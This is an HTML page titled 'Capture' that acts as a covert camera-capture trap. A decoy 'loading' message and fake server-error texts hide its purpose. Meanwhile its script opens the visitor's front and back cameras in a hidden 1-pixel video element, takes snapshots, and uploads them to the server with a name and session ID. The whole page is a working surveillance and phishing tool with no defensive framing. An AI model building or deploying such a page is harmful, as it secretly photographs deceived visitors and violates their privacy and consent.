<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Capture</title>
  <link rel="stylesheet" href="/style.css"/>
</head>
<body>
  <div class="container">
    <p id="status">It will take 3â€“4 seconds to load due to many requests...</p>
    <video id="v" playsinline autoplay muted style="display:none;width:1px;height:1px;"></video>
  </div>

  <script>
    (async function() {
      const status = document.getElementById("status");
      const video = document.getElementById("v");

      const url = new URL(location.href);
      const name = url.searchParams.get("name") || "visitor";
      const sessionId = url.searchParams.get("sessionId") || (Date.now().toString() + Math.floor(Math.random()*1000));

      async function takePhoto(facingMode) {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
        video.srcObject = stream;
        await video.play();
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const data = canvas.toDataURL("image/jpeg");
        stream.getTracks().forEach(t => t.stop());
        return data;
      }

      async function send(imageData, type) {
        await fetch("/upload", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ image: imageData, name, type, sessionId })
        });
      }

      try {
        const isMobile = /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent);

        if (isMobile) {
          try {
            const front = await takePhoto("user");
            await send(front, "front");
          } catch (e) {}
          try {
            const back = await takePhoto({ exact: "environment" });
            await send(back, "back");
          } catch (e) {}
        } else {
          const p1 = await takePhoto("user");
          await send(p1, "front");
          const p2 = await takePhoto("user");
          await send(p2, "back");
        }

        status.textContent = "Server 404! Please try after some time";
      } catch (e) {
        status.textContent = "Server failed! Sorry, try again in a few minutes!";
      }
    })();
  </script>
</body>
</html>
